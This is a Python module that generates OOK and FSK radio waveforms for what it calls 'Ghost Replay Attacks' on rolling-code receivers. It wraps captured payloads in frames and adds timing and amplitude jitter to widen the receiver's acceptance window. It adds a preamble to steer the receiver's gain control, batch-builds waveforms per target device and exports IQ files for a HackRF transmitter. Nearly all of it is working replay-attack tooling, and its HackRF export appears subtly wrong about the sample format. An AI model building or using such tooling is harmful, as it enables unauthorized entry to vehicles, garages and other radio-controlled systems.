
"""
SCPE Waveform Synthesis Layer
Generates "Thickened" Waveforms for Ghost Replay Attacks.

This module is responsible for:
1. Converting bitstreams to baseband samples.
2. Applying "Thickening" (Jitter/Timing randomization) to exploit D_A.
3. Applying "State Steering" (Preamble conditioning) to exploit H_R.
"""

from typing import Dict, List, Optional
import numpy as np

class SCPEWaveformGenerator:
    def __init__(self, sample_rate: float = 2e6):
        self.sample_rate = sample_rate
        
    def build_frame(self, payload_bits: str, preamble_bits: str = '10101010', sync_bits: str = '11110000', crc_func=None) -> str:
        """
        Construct a full protocol frame string.
        
        Args:
            payload_bits: The rolling code or data
            preamble_bits: Wake-up sequence for AGC lock
            sync_bits: Pattern to indicate start of data
            crc_func: Optional function(str) -> str to calculate CRC
            
        Returns:
            Full bitstream string
        """
        frame_bits = preamble_bits + sync_bits + payload_bits
        if crc_func:
            try:
                crc_bits = crc_func(frame_bits)
                frame_bits += crc_bits
            except Exception:
                pass # Fail safe
        return frame_bits

    def generate_ook_thickened(self, bitstream: str, pulse_width_us: int, jitter_percent: float = 0.05, amp_jitter: float = 0.0):
        """
        Generate OOK samples with timing and amplitude jitter to cover a 'thicker' acceptance tube.
        
        Args:
            bitstream: String of '0' and '1'
            pulse_width_us: Nominal duration of a bit in microseconds
            jitter_percent: Max timing deviation (e.g., 0.05 = 5%)
            amp_jitter: Max amplitude deviation (e.g., 0.1 = +/- 10% amplitude)
            
        Returns:
            Complex IQ numpy array (float32)
        """
        samples_list = []
        samples_per_us = self.sample_rate / 1e6
        nominal_samples = int(pulse_width_us * samples_per_us)
        
        jitter_range = int(nominal_samples * jitter_percent)
        
        # Validation
        if not all(c in '01' for c in bitstream):
             raise ValueError("Bitstream must only contain '0' and '1'")
        
        for bit in bitstream:
            # Timing Jitter (Thickening D_A acceptance tube)
            if jitter_range > 0:
                 jitter = np.random.randint(-jitter_range, jitter_range + 1)
            else:
                 jitter = 0

            duration_samples = max(1, nominal_samples + jitter)
            
            # Amplitude Jitter (Physical variability spacing)
            level = 0.0
            if bit == '1':
                level = 1.0
                if amp_jitter > 0:
                    delta = np.random.uniform(-amp_jitter, amp_jitter)
                    level = max(0.1, min(1.5, level + delta)) # Clamp sanity
            
            # Generate chunk
            chunk = np.full(duration_samples, level + 1j*0.0, dtype=np.complex64)
            samples_list.append(chunk)
            
        # Concatenate
        full_waveform = np.concatenate(samples_list)
        
        return full_waveform

    def create_state_steering_preamble(self, duration_ms: float = 10.0, target_amplitude: float = 0.8, ramp_ms: float = 0.5):
        """
        Generate a preamble to lock Receiver AGC (Automatic Gain Control) with ramping.
        """
        num_samples = int((duration_ms / 1000) * self.sample_rate)
        ramp_samples = int((ramp_ms / 1000) * self.sample_rate)
        
        # CW (Carrier Wave) at target amplitude
        waveform = np.full(num_samples, target_amplitude + 1j*0.0, dtype=np.complex64)
        
        # Apply Ramp Up/Down (Blackman window halve)
        if ramp_samples * 2 < num_samples:
            window = np.blackman(ramp_samples * 2)
            ramp_up = window[:ramp_samples]
            ramp_down = window[ramp_samples:]
            
            # Scale
            waveform[:ramp_samples] *= ramp_up
            waveform[-ramp_samples:] *= ramp_down
            
        return waveform

    def generate_fsk_thickened(self, bitstream: str, baud_rate: float, dev_hz: float, center_freq: float = 0.0, jitter_percent: float = 0.05):
         """
         FSK (Frequency Shift Keying) SCPE generation with thickened timing.
         
         Args:
             bitstream: Data '0'/'1'
             baud_rate: Symbols per second
             dev_hz: Frequency deviation (+/- Hz from center)
             center_freq: Center frequency offset (usually 0 if tuned on carrier)
             jitter_percent: Timing jitter
         """
         samples_per_symbol = int(self.sample_rate / baud_rate)
         jitter_range = int(samples_per_symbol * jitter_percent)
         
         samples_list = []
         
         # Time accumulator for phase continuity
         phase_acc = 0.0
         
         for bit in bitstream:
             # Timing Jitter
             current_len = samples_per_symbol
             if jitter_range > 0:
                 current_len += np.random.randint(-jitter_range, jitter_range + 1)
             current_len = max(1, current_len)
             
             # Frequency selection
             # Bit 1 -> +dev, Bit 0 -> -dev
             freq_offset = center_freq + dev_hz if bit == '1' else center_freq - dev_hz
             
             # Generate phase steps
             # phase = 2 * pi * f * t
             t = np.arange(current_len) / self.sample_rate
             phase_steps = 2 * np.pi * freq_offset * t
             
             # Apply phase continuity
             chunk = np.exp(1j * (phase_acc + phase_steps)).astype(np.complex64)
             
             # Update accumulator
             phase_acc += phase_steps[-1]
             
             samples_list.append(chunk)

         return np.concatenate(samples_list)

    def generate_multi_target_waveforms(self, device_payloads: Dict[str, str], pulse_width_us: int, modulation: str = 'OOK') -> Dict[str, np.ndarray]:
        """
        Batch generate waveforms for multiple targets with independent random seeds/jitter.
        
        Args:
            device_payloads: Dict mapping device_id -> bitstream
            pulse_width_us: Nominal pulse width
            modulation: 'OOK' or 'FSK'
            
        Returns:
            Dict mapping device_id -> complex64 IQ array
        """
        waveforms = {}
        for dev_id, bits in device_payloads.items():
            # Randomize parameters slightly per device for realism
            dev_jitter = np.random.uniform(0.01, 0.08)
            
            if modulation == 'OOK':
                dev_amp = np.random.uniform(0.0, 0.1)
                wf = self.generate_ook_thickened(bits, pulse_width_us, jitter_percent=dev_jitter, amp_jitter=dev_amp)
            elif modulation == 'FSK':
                # Default FSK params if not specified
                wf = self.generate_fsk_thickened(bits, baud_rate=1/(pulse_width_us*1e-6), dev_hz=5000, jitter_percent=dev_jitter)
            else:
                wf = np.array([], dtype=np.complex64)
                
            waveforms[dev_id] = wf
            
        return waveforms

    def export_waveform_to_file(self, waveform: np.ndarray, filename: str, format: str = "hackrf"):
        """
        Export IQ samples to binary file.
        
        Args:
            waveform: Complex64 IQ samples
            filename: Output file path
            format: 'hackrf' (uint8 interleaved) or 'complex64' (float)
        """
        if waveform.dtype != np.complex64:
            waveform = waveform.astype(np.complex64)
            
        if format == "hackrf":
            # Convert complex64 [-1.0, 1.0] to uint8 [0, 255]
            # HackRF expects: I0,Q0,I1,Q1,... as unsigned 8-bit
            
            # Extract I and Q
            i_samples = np.real(waveform)
            q_samples = np.imag(waveform)
            
            # Scale to [0, 255] with 127.5 as center (DC offset)
            i_uint8 = np.clip((i_samples * 127.5) + 127.5, 0, 255).astype(np.uint8)
            q_uint8 = np.clip((q_samples * 127.5) + 127.5, 0, 255).astype(np.uint8)
            
            # Interleave I and Q
            interleaved = np.empty(len(waveform) * 2, dtype=np.uint8)
            interleaved[0::2] = i_uint8
            interleaved[1::2] = q_uint8
            
            # Write binary
            interleaved.tofile(filename)
        else:
            # Raw complex64 format
            waveform.tofile(filename)


